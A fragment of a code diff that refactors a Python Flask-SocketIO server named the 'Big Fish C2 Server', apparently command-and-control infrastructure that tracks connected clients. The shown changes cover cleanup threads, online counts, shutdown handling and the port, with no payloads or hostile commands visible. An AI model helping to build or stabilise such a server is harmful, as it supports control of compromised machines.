+            
+            socketio.emit('stats_update', {
+                'online_count': online_count,
+                'timestamp': current_time
+            }, namespace='/')
+            
+            logger.debug(f"[✓] Cleanup completed, {online_count} clients online")
             
         except Exception as e:
             logger.error(f"[✗] Cleanup error: {e}")
         
-        time.sleep(3600)  # Run every hour
-
-def update_client_status():
-    """Update client status periodically"""
-    while True:
-        try:
-            conn = get_db()
-            c = conn.cursor()
-            current_time = time.time()
-            
-            # Mark clients as offline
-            c.execute("UPDATE clients SET status = 'offline' WHERE ? - last_seen > ?",
-                     (current_time, ONLINE_THRESHOLD))
-            
-            conn.commit()
-            conn.close()
-            
-            # Broadcast status update
-            socketio.emit('status_update', {
-                'timestamp': current_time,
-                'online_count': get_online_count()
-            })
-            
-        except Exception as e:
-            logger.error(f"[✗] Status update error: {e}")
-        
-        time.sleep(30)  # Run every 30 seconds
-
-def get_online_count():
-    """Get count of online clients"""
-    try:
-        conn = get_db()
-        c = conn.cursor()
-        current_time = time.time()
-        c.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
-        count = c.fetchone()[0]
-        conn.close()
-        return count
-    except:
-        return 0
+        time.sleep(60)  # Run every minute
 
 # ==================== MAIN ====================
 
+def signal_handler(signum, frame):
+    """Handle shutdown signals"""
+    logger.info("[!] Shutdown signal received")
+    ConnectionPool.close_all()
+    logger.info("[✓] Clean shutdown")
+    sys.exit(0)
+
 if __name__ == '__main__':
-    PORT = int(os.environ.get('PORT', 5000))
+    import signal
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
     
-    # Start background threads
-    threading.Thread(target=cleanup_old_data, daemon=True).start()
-    threading.Thread(target=update_client_status, daemon=True).start()
+    PORT = int(os.environ.get('PORT', 5001))
     
-    logger.info(f"[✓] Big Fish C2 Server starting on port {PORT}")
-    logger.info(f"[✓] WebSocket enabled")
-    logger.info(f"[✓] Database: {os.path.abspath(DATABASE)}")
-    logger.info(f"[✓] Encryption key loaded")
+    # Start cleanup thread
+    cleanup_thread = threading.Thread(target=cleanup_task, daemon=True)
+    cleanup_thread.start()
     
-    socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
+    logger.info(f"[✓] Stable Big Fish C2 Server starting on port {PORT}")
+    logger.info(f"[✓] Press Ctrl+C to stop")
+    
+    try:
+        socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
+    except KeyboardInterrupt:
+        logger.info("[!] Server stopped by user")
+    finally:
+        ConnectionPool.close_all()
